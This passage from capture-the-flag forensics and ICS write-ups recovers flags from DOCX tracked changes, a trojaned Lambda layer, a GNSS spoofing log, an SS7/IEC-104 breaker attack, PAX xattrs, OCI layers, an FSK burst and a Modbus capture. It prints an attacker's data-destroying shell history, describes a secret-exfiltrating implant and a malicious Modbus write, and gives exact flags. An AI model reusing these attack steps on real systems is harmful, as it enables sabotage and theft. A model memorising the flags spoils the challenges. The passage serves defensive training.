Two codes appear. One is clean, `CSCTF{dispatch_0f7c0c00aac69bbb86d6b96391f5d112}` — the "fresh authorization" `s.kessler` typed in, printed in the copy the crews received, and a decoy. The other is split inside `<w:del>/<w:delText>` elements (Word's Track Changes deletions) across two deletion runs (`w:id` 107 and 108), so the raw grep hit has markup wedged in the middle:

```
CSCTF{redline_21ee9b19d</w:delText>…<w:del w:id="108" …><w:r><w:delText …>342e06432165fb2b6f64e06}
```

*3. Reject the changes to rebuild the approved directive.* Rather than hand-edit XML, walk the tracked changes: for each paragraph, the received text is the untouched runs plus insertions (`w:ins`), and the approved text is the untouched runs plus deletions (`w:del`):

```python
for p in body.iter(W + "p"):
    for child in p:
        if child.tag == W + "r":   got += text_of(child,"t"); orig += text_of(child,"t")
        elif child.tag == W + "del":  orig += text_of(child,"delText")   # approved only
        elif child.tag == W + "ins":  got  += text_of(child,"t")         # received only
```

The run of changes, all by `s.kessler` at `02:41:00Z`, reads: `temperature`→`thermal` (cosmetic); paging threshold `30`→`90` minutes; and the disposition rewritten from "Vials that exceeded 8 C MUST be quarantined and MUST NOT be redistributed. Excursion authorization: CSCTF{redline_21ee9b19d342e06432165fb2b6f64e06}." to "…may be returned to distribution at depot-supervisor discretion. Excursion authorization: CSCTF{dispatch_…}." In the approved (all-rejected) text, the two deleted runs 107 and 108 rejoin into one code, which is the flag.

**Why it works**

With Track Changes on, Word keeps deleted text in the file as `<w:delText>` inside a `<w:del>` element that records the editor and time, so a reviewer can still reject the change. `s.kessler` edited the approved directive with tracking on and never accepted the changes, so the copy the crews received still contains A. Reyes's original wording and authorization underneath the new text. Splitting the code over two deletion runs only defeats a plain text search; walking the XML in document order and keeping every `w:del` while dropping every `w:ins` puts the original back together and rebuilds the approved version.

**Validation / reproduction**

The rebuilt approved paragraph reads as a coherent original directive, and the recovered code fits the `CSCTF{message}` format. Reproduction: `unzip -p` the core properties and comment, grep the body to spot the two codes, then walk the paragraphs rejecting changes to rejoin runs 107/108. The team's automated intake submitted three wrong values before any analysis — the decoy `dispatch_` code, then two malformed copies of the deleted code with leftover XML text between its two halves — and the solver's clean rejoined value was then accepted.

### Shadow-Dispatch

> Forensics · Hard · Marius Merai  
> Points: 592 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{b6b0881524852112e5d422f75053d324}`

**Challenge**

> You are the on-call analyst at VNCD-CERT. GridLink Dispatch authorizes load-shedding orders for a regional grid. After a routine deployment it began emitting unusual telemetry, yet engineers report no unauthorized changes. Determine what changed and recover the order-signing key from the preserved investigation bundle. Flag format: `CSCTF{<32_lowercase_hex>}`.

The attachment `shadow-dispatch.zip` is an AWS account snapshot: CloudTrail, CloudWatch log groups for the authorizer and signer Lambdas, function version history, IAM policies, and one zip per published layer version. Use CPython 3.12 (via `uv`) throughout — the layer `.pyc` files were built for 3.12, and only its `importlib.util.source_hash` and marshal format match.

**Approach / walkthrough**

*1. Deployment record.* `function-versions.json` shows function version N always pins layer `auth-utils:N` (plus the two other shared layers). CloudTrail contains only normal deploy APIs (`PublishVersion`, `UpdateFunctionCode`, `PublishLayerVersion`, …), all from the `gridlink-cicd-deploy` role, plus SSM/KMS traffic from the running functions. At the API level "no unauthorized changes" holds.

*2. The anomaly.* The authorizer should read exactly one parameter, `/gridlink/ruleset-channel`. Counting `GetParameter` by caller shows it reading **all four** `/gridlink/*` secrets 81 times each, with 324 matching KMS `Decrypt` calls — and its execution role already allowed `ssm:GetParameter` on `parameter/gridlink/*` plus `kms:Decrypt`, so the reads never needed a permission change. The signer only ever prints `key_version=1`, so the key must have left through the authorizer's per-order `correlation` telemetry, emitted by the shared `auth-utils` layer's `_authlog.py`.

*3. The source is clean.* All ten published `_authlog.py` copies differ only in a trailing build comment. The "integrity beacon" is honest: `_beacon()` returns `sha256(__file__)[:16]`; each token is `index(1) ‖ ct(2) ‖ crc16-ccitt-false(index‖pt‖salt)(2) ‖ salt(11)`, hex-encoded, where `index = order_id % 8`, `pt` is 2 beacon bytes, and `ct = pt XOR sha256(request_id‖salt)[:2]`. The request id is printed in the same log line and the salt is inside the token, so the token is decryptable by anyone holding the logs, and every token of a version decrypts to that version's self-hash. Boring by design.

*4. The bytecode is not.* Each layer zip ships `python/__pycache__/_authlog.cpython-312.pyc`, and Lambda executes a cached pyc instead of recompiling the `.py`. A pyc header holds a 4-byte magic, a 4-byte flags word, then an 8-byte source hash. All ten here carry flags `0x001` — hash-based but **unchecked** — so Python never re-validates the pyc against the `.py` beside it. Comparing each header's source hash with `importlib.util.source_hash(.py)` in CPython 3.12:

```
auth-utils-1  2788  0x001  True      auth-utils-6  3576  0x001  False
auth-utils-2  2788  0x001  True      auth-utils-7  2788  0x001  True
auth-utils-3  2788  0x001  True      auth-utils-8  3576  0x001  False
auth-utils-4  3571  0x001  False     auth-utils-9  2788  0x001  True
auth-utils-5  2788  0x001  True      auth-utils-10 3576  0x001  False
```

Layers 4, 6, 8, 10 don't match their source and are ~800 bytes larger — pinned by function versions 4, 6, 8, 10.

*5. Read the implant.* `marshal.loads` the code object (after the 16-byte header) and read the module-level `LOAD_CONST/STORE_NAME` pairs: `_EVERY=5`, `_NAMES` (the four SSM parameter names) and `_PICK`. Disassembling the implanted `_beacon` shows a branch on `order_id % 5`: when it is 0 it fetches all four SSM secrets `WithDecryption=True` and returns `secrets[_PICK]` (2 real secret bytes per token); otherwise it returns the normal self-hash, so 4 of every 5 orders look normal. `_PICK` selects a different secret per trojaned layer — layer 4 the portal session secret, 6 the DB password, 10 the metrics token, and **layer 8 `/gridlink/order-hmac-key`**, the order-signing key. The signer stores that key as hex, so its beacon is the 16 raw key bytes → exactly the 32-lowercase-hex flag shape. The four trojaned versions also explain the 4 × 81 `GetParameter` blizzard.

*6. Reassemble.* Parse all authorizer streams, take the function version from each `START … Version: N` line, decrypt every token (keystream from the request id, salt and index from the token), keep CRC-valid plaintexts, and bucket the 2-byte chunks by `(version, order_id % 5 == 0, index)`. Function version 8's leak bucket gives one 16-byte value across all eight indexes:

```
function version 8 pinned auth-utils 8, which leaked /gridlink/order-hmac-key:
CSCTF{b6b0881524852112e5d422f75053d324}
```

**Why it works**

CPython runs an unchecked hash-based pyc without comparing it to the `.py` beside it, so reviewers read clean source while Lambda executed trojaned bytecode published through the normal CI role — nothing unauthorized in any place anyone looked. The implant misbehaves only on every fifth order and leaks its secret two bytes at a time inside the existing telemetry format, so the exfiltration is indistinguishable from normal telemetry unless decrypted. But that format is decryptable by design and carries a CRC, so the preserved authorizer log group is a complete, verifiable record of the theft, and version 8's eight chunks reassemble into the 16-byte signing key.

**Validation / reproduction**

All 1,174 tokens passed their CRC. For every clean version both the "every-fifth-order" and "other-orders" buckets are identical and equal `sha256(_authlog.py)[:16]` — checked directly for version 1 (`fb71988e…a5e8`). Each index in the version 8 leak bucket held exactly one value, with no conflicts; merging the two buckets instead would pit a key chunk against a self-hash chunk and turn the reassembly to noise. The three other trojaned versions produce equally flag-shaped 32-hex strings, so the `_PICK` → parameter-name mapping from step 5 is what rules them out — only layer 8 leaks the HMAC key. The signer shows `key_version=1` throughout and CloudTrail has no `PutParameter`, so the key was never rotated. The same four layers (4, 6, 8, 10) were also flagged by an independent method — recompiling each `.py` with `-OO` (`compile(..., optimize=2)`) and comparing code objects instead of header hashes. Accepted on first submission.

### Signal Reconciliation

> Forensics · Not shown · Concept and defensive navigation-integrity scenario by Balint; fresh CSCTF26 implementation.  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{EOSL5C6VZ54TN2PWXUO2B5TVHMVY5G3NWPILLYY}`

**Challenge**

> A state-linked actor altered a fictional reconnaissance receiver feed during mobilization. Before the receiver profile is reused, reconcile its local-position export with the independently integrated local-navigation series and produce the complete response-cell record. Flag format: `CSCTF{BASE32_192_BIT_DIGEST}` (just the format example — 192 bits of a digest, Base32-encoded; don't submit it).

The attachment `signal-reconciliation.zip` (13,341 bytes, SHA-256 `ea09de45…1633`) holds `flight.ndjson` (601 samples of INS velocity plus receiver east/north position), a mission note, `reconciliation-sop.txt`, and a SHA-256 `manifest.txt`. The SOP specifies the entire computation and the exact bytes of the report whose hash is the flag.

**Approach / walkthrough**

*1. Verify.* Check the zip against the brief's hash, then `tail -n 3 manifest.txt | shasum -a 256 -c` for the three inner files.

*2. Validate the input against the SOP grammar.* A byte regex confirms exactly 601 LF-terminated lines, fixed key order `{"i","t_ms","ve_mmps","vn_mmps","gps_e_mm","gps_n_mm"}`, integers matching `0|-?[1-9][0-9]*`, `i` incrementing by one and `t_ms = 100*i`. Critically, every trapezoid sum `ve[i]+ve[i+1]` and `vn[i]+vn[i+1]` is divisible by 20 (zero exceptions), so the SOP's "exact mathematical integer division" never needs rounding and plain integer `//` is exact — no floating-point choice can creep in.

*3. Integrate INS and form the residual.* `ins[0]=0`; `ins[i+1] = ins[i] + (v[i]+v[i+1])//20` per axis (trapezoid rule: mean velocity × 0.1 s, in mm). Then `res = gps − ins` per axis.

*4. Window inventory.* For each `i = 0..591`, `Q(i)` is true iff every `j=i..i+9` has `res_e[j]²+res_n[j]² ≥ 625000000` (25 m), every step `res_e[j+1]−res_e[j] ≥ 1000` (east grows ≥1 m/step) and `|res_n[j+1]−res_n[j]| ≤ 500` (north steady ±0.5 m). The residual is zero while the receiver is honest; it shows 18 ten-sample walk-off ramps (25 m → 34 m east, north unchanged, then snapping back) plus one 100 m offset at `i=600`. Each ramp satisfies `Q` once, at its onset, so `QSET` is the complete increasing set of all 18 onsets, **not just the first**:

```
qset = 5,35,50,66,84,95,182,214,247,287,309,357,387,453,465,542,567,588
```

Reporting only `qset=5` yields a different report hash and a wrong flag — the SOP's chief trap.

*5. Decision.* `QUARANTINE_GNSS_PROFILE` iff QSET is non-empty **and** `res[600]² ≥ 10¹⁰` (100 m). At `i=600`, `res_e=100000, res_n=1000`, so `|res|² = 10001000000 ≥ 10¹⁰`; with a non-empty QSET the decision is `QUARANTINE_GNSS_PROFILE`.

*6. Canonical report and flag.* Write 603 ASCII lines, LF-only, ending in exactly one LF: a header line, one `E|i|t_ms|ins_e|ins_n|gps_e|gps_n|res_e|res_n` per sample, and a `SUMMARY` line whose `qset` is byte-identical to the header's. The flag body is uppercase unpadded RFC 4648 Base32 of the first 24 bytes (192 bits) of SHA-256 over the complete report:

```python
digest = hashlib.sha256(open("report.txt","rb").read()).digest()
# 23a4be8bd5cf7936e9f6bd1da0f6753b2b8e9b6db3d0b5e3...
print("CSCTF{" + base64.b32encode(digest[:24]).decode().rstrip("=") + "}")
# CSCTF{EOSL5C6VZ54TN2PWXUO2B5TVHMVY5G3NWPILLYY}
```

**Why it works**

INS velocity integrated over time gives a dead-reckoned track a GNSS spoofer cannot touch, so the residual between it and the receiver is zero while the receiver is honest and shows the classic drag-off signature — a large, steadily growing, one-directional offset — while it is being spoofed. The rest is a determinism exercise: integer arithmetic, the window predicate and the report layout are all fixed, so the truncated-SHA-256 → Base32 flag is only correct if every onset and every byte is right. The traps are reporting a single onset and getting line endings or number formatting wrong.

**Validation / reproduction**

The report writer was first run on the SOP's all-zero known-answer test (601 zero rows): it reproduced the stated 14,329 bytes and SHA-256 `cc8c52dc…87f1` exactly, proving the line format, separators and final LF before touching the real data. The real report was then spot-checked: 603 lines, `SUMMARY` qset byte-identical to the header, last byte `0x0a`. Reproduction: validate the grammar and the divisible-by-20 property, integrate, evaluate `Q` over all 18 onsets, write the canonical report, then hash → Base32. Accepted on first submission.

### Silent Breaker

> Forensics · Medium · Dan-Andrei Grigorescu  
> Points: 270 · Flag submitted by: secretNinja

**The flag**

`CSCTF{CmBWwc0Qds8aFImcMJTsSftS}` — the clearance code is random per instance; this was ours. The method carries over, the numbers do not.

**Challenge**

A per-team Docker container served a signaling investigation console and a forensic bundle from a substation's IEC 60870-5-104 network: a regional breaker tripped without warning, reconstruct what happened and who is responsible. `GET /files/` serves a case-file index and the report contract; `GET /events` is the flagged-signaling feed; a completed five-field report goes to `POST /submit`, which returns the recovery-authorization flag for a correct report. CTFd is never queried directly — all work was done against our own spawned instance (`<instance>`), through only the documented routes.

`GET /files/` served: `README.md` (the report contract, routes, budgets, `/submit` field definitions), `roster.json` (8 fictional staff with `employee_id`, department, `ot_vpn_access`, MSISDN), `iec104_capture.pcap` (127 packets, master `192.0.2.10:51000` ↔ RTU `198.51.100.10:2404`), and `hmi_monitoring.log` (historian breaker-current log for IOA `0x2c88`). Lookups are budgeted — `GET /query/subscriber` budgeted, `POST /confirm-target` 2 attempts, `GET /query/vpn-window` budgeted after confirm, `POST /submit` 5 reports with pass/fail only — so every field was derived offline before any attempt was spent.

**Approach / walkthrough**

*1. Rogue signaling peer → compromised employee.* `GET /events` lists 8 MAP operations, all from one global title outside the legitimate `GT-0000..GT-0999` range (our instance: `GT-9724-V88`), so every event is the attacker's. They split into `SendRoutingInfoForSM` (SRI-SM reconnaissance) and three `UpdateLocation` operations — registering the subscriber at an attacker-controlled location, which hijacks their SMS and with it any OTP. Joining the three `UpdateLocation` MSISDNs against `roster.json`, only one target has `ot_vpn_access: true` (our instance: `+882-16-6461297` → `VLK-4216-ION` Radu Ionescu, OT Field Engineering). The roster carries three people surnamed Ionescu, so the join must key on `employee_id`, not name. One budgeted `GET /query/subscriber?msisdn=…` returned `{"known_subscriber":true,"watchlisted":true}`, and `POST /confirm-target {"employee_id":"VLK-4216-ION"}` confirmed on the first of its 2 attempts, unlocking the VPN query.

*2. OT-VPN session.* `GET /query/vpn-window` returns RADIUS logs. The target's session is an Access-Request → Access-Challenge ("Enter OTP") → Access-Accept completing about 100 s after the hijacking `UpdateLocation`, which fits an SMS-OTP intercept (our instance: `session-id VPN-320493`). A second Ionescu (Legal) has a session in the same minute as a decoy, so again key on `employee_id`.

*3. The breaker command on the wire.* The solver host had no tshark, so the pcap was walked with a short Python libpcap/IEC-104 APCI reader: Ethernet → IPv4 → TCP, split the payload into `0x68`-start APDUs, keep I-frames, decode ASDU type/COT/IOA/element. The capture holds only TI 13 (`M_ME_NC_1`, short-float measurements) and two TI 45 (`C_SC_NA_1`, single command) frames. One TI 45 is an activation (COT 6) to IOA `0x2c88` with `SCO=0x01` — low bit SCS=1 = **ON**, S/E=0, a direct execute with no select-before-operate; the other is the RTU's activation confirmation (COT 7). These give the IOA `0x2c88`, qualifier `ON`, and the command minute in UTC (our instance: `19:50`, wire time, not the VPN start).

*4. The forged historian current.* `hmi_monitoring.log` normally reads ~430 A for IOA `0x2c88`. Around the command it holds flat at a constant value (our instance: 524.5 A) and is marked `QUALITY=SUSPECT` from the third identical reading onward. That value is inside the contract's 150–550 A engineering range and more than 5 A off live, as the contract defines a frozen record. Over the same window the pcap's TI 13 floats keep reporting ~431 A with good QDS and COT 1 (periodic), so the RTU's data was live and only the historian display was frozen. → `telemetry_status` = the frozen value (our instance: `524.5`).

*5. Report.* One `POST /submit` with the five fields (IOA, qualifier, command time, frozen telemetry, VPN session) returned `{"status":"correct", "attempts_remaining":4, "clearance_code":"CSCTF{…}"}` — accepted on the first report. The clearance code was submitted to CTFd once and accepted, and the instance was stopped afterwards.

**Why it works**

The attack chain crosses two domains. An SS7 `UpdateLocation` from an illegitimate peer redirects the engineer's SMS, which lets the attacker pass the OTP step of the engineer's OT-VPN login. IEC-104 has no authentication, so a single direct-execute `C_SC_NA_1` operates the breaker. Replaying a stale value into the historian hides the trip from operators. The wire capture disagrees with the historian — the frozen value never appears in the QDS on the wire — and that disagreement is what exposes the forgery.

**Validation / reproduction**

Every field was fixed offline and cross-checked (pcap TI 13 against the historian for the current, RADIUS timing against the `UpdateLocation` for the session) before the first report. The instance accepted that first report with 4 of 5 attempts left, and the returned clearance code was accepted by CTFd on its single submission. Reproduction (against a fresh instance): decode the IEC-104 command with any dissector (e.g. `tshark -r iec104_capture.pcap -Y iec60870_asdu.typeid==45`) or the plain-Python APCI walk, join the rogue `UpdateLocation` MSISDNs against `roster.json` on `ot_vpn_access`/`employee_id`, match the VPN session by employee id, and read the frozen value against the wire. The flag is random per instance, so the specific values above only apply to ours.

### The Capability Ghost

> Forensics · Easy · Mohamed Amine Mzoughi  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{fg6_x7i9b6b3nn_bj7sj}`

**Challenge**

> A hostile-state campaign targeted the build runner for rail-signaling software. Responders kept the runner's filesystem archive and journal. Recover the sealed marker. Inspect the records as data: do not run the supplied programs or restore their capabilities.

The attachment `capability-ghost.zip` (51,023 bytes, SHA-256 `c53a8383…1ffe`) holds `runner-fs.tar.gz` (a filesystem tree whose PAX headers store xattrs), a real systemd `runner.journal`, a responder README and a manifest.

**Approach / walkthrough**

*1. Unpack and read the history.* Unpack without applying attributes so nothing gets a capability back (`tar --no-xattrs -xzf …`; the harmless `hdrcharset=BINARY` warning on `hc-probe` is because one xattr value is non-text — the one we need). `root/.bash_history` tells the whole story:

```sh
setcap cap_dac_read_search+ep /usr/local/bin/hc-probe
TAG=$(head -c8 /dev/urandom | xxd -p)
setfattr -n user.build_seal -v "0x$TAG" /usr/local/bin/hc-probe
EPOCH=$(date +%s)
/usr/local/bin/hc-probe --seal "$TAG" "$EPOCH" /etc/solunet/signaling-cfg /etc/solunet/signaling-cfg.sealed
shred -u /etc/solunet/signaling-cfg
history -c
```

So `TAG` is 8 random bytes stored raw in the xattr `user.build_seal` on the probe (the `0x` prefix tells `setfattr` the value is hex), `EPOCH` is the seal time, and the probe turned the config into the 27-byte `signaling-cfg.sealed` before the plaintext was shredded and the history cleared. The tag and epoch were shell variables, so they are not in the history — we need the scheme, the tag and the epoch.

*2. Read the sealing scheme out of the probe (never run it).* Its usage text spells it out:

```
key = HMAC-SHA256(key = raw_bytes(tag_hex), msg = ascii_decimal_string(seal_epoch))
out[i] = in[i] XOR key[i mod 32]
```

Seal and unseal are the same operation (repeating-key XOR). The text even says where both inputs live: the tag in the host's extended attributes, the epoch in the probe's journal entry's `X_SEAL_EPOCH` field — **not** the entry's wall-clock time.

*3. Get the tag from the PAX headers.* A pax tarball records each xattr as a `SCHILY.xattr.<name>` keyword, which Python's `tarfile` exposes as `pax_headers` without applying anything:

```
./usr/local/bin/hc-probe  user.build_seal  509df6cd8e103fa5
```

So `tag_hex = 509df6cd8e103fa5`; the HMAC key is those 8 raw bytes (recovered via `encode("utf-8","surrogateescape")` because the value is binary), not the 16-character hex text. The other rows are context explaining the title — `security.capability` blobs on `ping` (`cap_net_raw`), the probe (`cap_dac_read_search`, matching the `setcap` line) and `backup-sync` (`cap_net_bind_service`), plus a `user.sync_id` ASCII label — but are not key material.

*4. Get the seal epoch from the journal.* The journal fields are uncompressed, so `strings runner.journal | grep X_SEAL_EPOCH` gives `X_SEAL_EPOCH=1793294042`. The entry's own timestamp is 12 seconds later (`1793294054`); as the usage text warns, that wall-clock time only gives garbage.

*5. Unseal.* Compute the HMAC and XOR it over the 27-byte sealed file:

```python
key = hmac.new(bytes.fromhex("509df6cd8e103fa5"), b"1793294042", hashlib.sha256).digest()
# f30644afe14fedd4585c5cda81ced08b71ddb3b572e3c4f744f302ecff16446d
print(bytes(b ^ key[i % 32] for i, b in enumerate(sealed)).decode())
# CSCTF{fg6_x7i9b6b3nn_bj7sj}
```

**Why it works**

The "seal" is a plain keyed XOR whose keystream is HMAC-SHA256 of the seal time keyed with an 8-byte random tag, so applying it a second time gives back the input. The plaintext was shredded and the history only shows the tag and epoch as shell variables, but both survived as metadata: the PAX format archives every extended attribute next to the capability blobs, so `user.build_seal` rode along in the tarball, and the probe logged its seal time as a structured `X_SEAL_EPOCH` journal field. Rebuilding the key needs no execution and no restored capability.

**Validation / reproduction**

The 27-byte XOR output decodes as clean ASCII in full `CSCTF{...}` form. The usage text warns that the entry's own wall-clock time gives garbage, so the `X_SEAL_EPOCH` value producing a readable flag is itself a check that the right epoch was used. Reproduction: `tar --no-xattrs` to read the history, read the scheme from `strings` on the probe, pull `user.build_seal` from the PAX headers, pull `X_SEAL_EPOCH` from the journal, HMAC and XOR. Accepted on first submission.

### The Layer That Wouldn't Die

> Forensics · Easy · Mohamed Amine Mzoughi  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{layer_remembers_93e33478c}`

**Challenge**

> A hostile-state campaign reached the registry behind Cascade Water Systems. Engineering had sealed a site credential into the vendor's configuration image; after the intrusion the marker that opens the seal is gone from the image's filesystem. Recover the sealed credential from the preserved OCI image layout. Inspect the files as data and execute nothing.

The attachment `historian-image.zip` (9,578 bytes, SHA-256 `e87c82ec…fe91`) unpacks to an OCI image layout (`oci-layout`, `index.json`, a content-addressed `blobs/sha256/` store) plus a SHA-256 manifest, which verifies cleanly — each blob's filename is its own digest, so nothing can be quietly altered and, more importantly, nothing is thrown away.

**Approach / walkthrough**

*1. Walk the pointer chain.* An OCI layout is a chain of JSON pointers: `index.json` → manifest → config, each by digest. The config carries a label `build.seal = ddc9bfb15738fbd10757eb936a593931` (16 hex bytes), five layer digests, and a build history whose comment on the `COPY historian.key.sealed` step documents the whole scheme:

```
sealed = plaintext XOR repeating(HMAC-SHA256(
             key = bytes.fromhex(Labels['build.seal']),
             msg = raw bytes of /etc/cascade/.sealed_marker as it stands at the end of this layer))
```

The history, bottom-first, reads: base rootfs → `COPY site/` (writes `config.yaml` with `marker_rev: A` and `.sealed_marker`) → `COPY historian.key.sealed` → `COPY site-rev-b/` (a different marker, `marker_rev: B`) → `RUN rm -f /etc/cascade/.sealed_marker`. So the seal is a repeating-key XOR, and the missing piece is the marker file the top layer deleted.

*2. Unpack the layers.* Each layer blob is a small tar of the files that layer wrote. Unpacking all five in stack order:

```
layer 2 (3fd0): etc/cascade/.sealed_marker, etc/cascade/config.yaml   (marker_rev: A)
layer 3 (928d): etc/cascade/historian.key.sealed                      (32 bytes of noise)
layer 4 (824c): etc/cascade/.sealed_marker, etc/cascade/config.yaml   (marker_rev: B)
layer 5 (be85): etc/cascade/.wh..sealed_marker                        (whiteout only)
```

In a layered image a delete never touches lower layers — the top layer's `RUN rm -f` only writes the OCI whiteout `.wh..sealed_marker` that hides the file in the merged view. Two generations of the marker survive in their layer tars: rev A (`f4901a8d…`) from layer 2, and rev B (`f5d8040f…`) from the rev-B push that came *after* the credential was sealed.

*3. Pick the right marker and unseal.* The comment says the marker used is the one current "at the end of this layer" — layer 3, where `historian.key.sealed` was added. At that moment the marker was the rev-A copy from layer 2; rev B arrived two layers later and sealed nothing. No faith required — both copies survived, so build the keystream from each and see which opens the seal. The sealed file is exactly 32 bytes, so one HMAC-SHA256 digest XORs across it in one pass:

```python
ks = hmac.new(bytes.fromhex("ddc9bfb15738fbd10757eb936a593931"), marker, hashlib.sha256).digest()
plain = bytes(b ^ ks[i % 32] for i, b in enumerate(sealed))
# rev-A marker f4901a8d… -> b'CSCTF{layer_remembers_93e33478c}'
# rev-B marker f5d8040f… -> 32 bytes of noise
```

**Why it works**

An OCI layout is content-addressed and append-only: every layer ever pushed stays in the blob store, and a later `rm` only writes a whiteout into the newest layer, so the "deleted" marker survives in two layer tars. The config blob hands you the rest — a build-history comment spelling out the seal (repeating-key XOR keyed by the `build.seal` label over the marker's raw bytes) and the label itself. Rebuilding the keystream is bookkeeping; the one real decision is which marker generation was current when the credential was sealed, and the layer order settles it in favor of rev A — the copy the intruders thought they had destroyed.

**Validation / reproduction**

Both surviving markers were tried. The rev-A marker from the deleted layer decrypts to clean `CSCTF{...}` ASCII; the rev-B copy produces 32 bytes of noise, which confirms the layer-order reasoning. Reproduction: `shasum -c` the manifest, walk `index.json` → manifest → config, unpack the five layer tars in order, then HMAC-XOR the sealed file with each surviving marker. Accepted on first submission.

### Tone Burst

> Forensics · Easy · Chronos Security  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{tone_burst_4481dda445a0a227c3a8eb90fda4fd92}`

**Challenge**

> A field relay's outage-training archive holds a short audio test burst carrying the last recovered relay identifier, but the text export is gone. Recover the identifier from the supplied WAV. This is a software-generated training signal; analyze the waveform visually or with code.

The attachment `tone-burst.wav` (147,244 bytes, SHA-256 `8ae5d946…fca7`) is plain uncompressed audio: `file` reports 16-bit mono PCM at 8000 Hz, 9.2 s long. Python's stdlib `wave` reads it directly, no audio library needed.

**Approach / walkthrough**

*1. Survey.* A "test burst" from a radio relay carrying a text identifier is almost certainly a modem signal, so the questions are which tones it uses and how long each symbol lasts. Measuring one frequency's strength is a single DFT bin — correlate the samples with a cosine and sine at that frequency:

```python
def power(chunk, f):
    k = 2 * math.pi * f / rate
    re = sum(v * math.cos(k * i) for i, v in enumerate(chunk))
    im = sum(v * math.sin(k * i) for i, v in enumerate(chunk))
    return re * re + im * im
```

Mark the 1 ms blocks that reach half the peak amplitude: the burst runs 0.24 s → 9.04 s (8.80 s), with only low noise outside it. A 50 Hz-step DFT sweep over the burst finds exactly two tones, **1000 Hz and 2000 Hz** — binary FSK, one tone per bit. Labeling each 1 ms block by its stronger tone and measuring run lengths, every run is a whole multiple of 20 ms, so one bit is 20 ms (160 samples, 50 baud). 8.80 s / 20 ms = 440 bits = 55 bytes.

*2. Demodulate.* For each 160-sample slot, compare the energy at 2000 Hz and 1000 Hz and emit `1` when the higher tone wins; pack the bits MSB first:

```python
spb = rate * 20 // 1000       # 160 samples/bit
bits = "".join("1" if power(x[i:i+spb], 2000) > power(x[i:i+spb], 1000) else "0"
               for i in range(start, end, spb))
data = bytes(int(bits[i:i+8], 2) for i in range(0, len(bits)-7, 8))   # MSB first
```

*3. Frame it.* The bytes are `aa aa aa aa` (an alternating-bit preamble to lock the bit clock), then `7e` (the HDLC-style sync byte), then plain 8-bit ASCII:

```
aa aa aa aa 7e 43 53 43 54 46 7b 74 6f 6e 65 5f 62 75 72 73 74 5f ...
lead-in: 10101010...    sync: 01111110
CSCTF{tone_burst_4481dda445a0a227c3a8eb90fda4fd92}
```

Everything after the sync byte `0x7E` is the identifier.

**Why it works**

The WAV is a clean synthetic binary FSK signal. Each 20 ms slot (160 samples at 8 kHz) holds a pure 1000 Hz or 2000 Hz tone, and that tone is the bit. Both tones fit a whole number of cycles into one slot (20 and 40), so they land exactly on bins of a 160-sample DFT and don't leak into each other — a per-slot energy comparison recovers every bit with a large margin. The standard burst layout (alternating preamble, `0x7E` sync, then the identifier as plain MSB-first ASCII) means decoding everything after the sync byte gives the flag directly.

**Validation / reproduction**

The tone-to-bit mapping and bit order are fixed by what the alternatives would produce: swapping the tones turns the sync byte into `0x81` and sets every byte's top bit; reading LSB-first turns `C` (`01000011`) into `0xC2`. Only MSB-first with 2000 Hz = 1 gives the `aa aa aa aa` preamble, a correct `7e` sync byte and readable ASCII. Reproduction: find the burst edges, DFT-sweep for the two tones, measure the 20 ms symbol, then demodulate MSB-first and read past the sync byte. Accepted on first submission.


## ICS

### Operation Blackout

> ICS · Hard · CSA Romania  
> Points: 540 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag:** `CSCTF{12fcdb0d}`

**Tools used**

tshark, xxd, jq, shasum, python3 (standard library).

**Challenge**

> A regional energy grid lost power at substation 0x4A2E. The recovered SCADA capture, HMI
> configuration, PLC firmware, event log, and alarm overrides describe the same incident from
> different operational layers. Reconstruct the incident only where the evidence agrees and submit
> the resulting marker. Flag format: `CSCTF{8_lowercase_hex}`

Five static artifacts, nothing to run:

| File | Size | What it is |
| --- | ---: | --- |
| `scada_network.pcap` | 3688 B | 36-packet Modbus/TCP + HTTP capture |
| `hmi_config.xml` | 1093 B | HMI calibration routine with a hidden Modbus write |
| `plc_firmware.bin` | 1024 B | PLC image with a `PLC1` header |
| `substation_log.json` | 1689 B | 9-entry event log |
| `alarm_override.dat` | 136 B | binary `ALRM` record of threshold changes |

The marker is in none of the files. You build it from the facts the files agree on. All analysis is
static, on the host.

**Approach**

**1. The capture — polling, one write, then an upload**

`-t ud` prints absolute UTC so the output is time-zone independent:

```sh
tshark -r scada_network.pcap -t ud
```

36 frames in three phases, with nothing ever answering: frames 1–30 are `192.168.50.5` polling the
PLC `192.168.50.10:502` every 10 s (06:00:10 → 06:05:00 UTC) with function 3 (Read Holding
Registers); frame 31 at 06:05:03 UTC is a single function 16 (Write Multiple Registers); frames
32–36 (06:05:18 → 06:06:18 UTC) are the PLC itself pushing a 151-byte TCP segment to
`198.51.100.42:80` every 15 s. The raw bytes of the write:

```sh
tshark -r scada_network.pcap -Y 'frame.number == 31' -T fields -e tcp.payload | xxd -r -p | xxd -g 1
```

```
00000000: 00 02 00 00 00 17 01 10 9c 41 00 40 10 55 fa 55  .........A.@.U.U
00000010: fa 55 fa 55 fa 55 fa 55 fa 55 fa 55 fa           .U.U.U.U.U.U.
```

`00 02` transaction 2, `00 00` protocol 0, `00 17` length 23, `01` unit 1, then the PDU: `10`
function 16, `9c 41` starting register (0x9C41 = 40001 in the 4xxxx numbering), `00 40` quantity 64,
`10` byte count 16, and eight copies of `55 fa` (= 22010). The request is malformed: 64 registers
need 128 data bytes but only 16 follow — remember that for the log. The five exfil segments all carry
the same 151 bytes: an HTTP-style `HTTP POST /upload HTTP/1.1`, `Host: 198.51.100.42`, and 50
repetitions of `de ad`.

From the capture: register `40001`, quantity 64, payload `55 FA`×8, exfil host `198.51.100.42` on
port 80, write at 06:05:03 UTC.

**2. The HMI configuration**

```sh
cat hmi_config.xml
```

It reads like a quarterly calibration until a comment reveals a hidden write:

```xml
<station_id>0x4A2E</station_id>
<CalibrationRoutine>
  <name>Q3_Equipment_Calibration</name>
  <ManifestSeed>137</ManifestSeed>
  <TargetDevice ip="192.168.50.10" port="502" protocol="Modbus/TCP"/>
  <!-- Hidden Modbus write command embedded in calibration routine -->
  <HiddenModbusWrite function_code="16" start_address="40001" count="64">
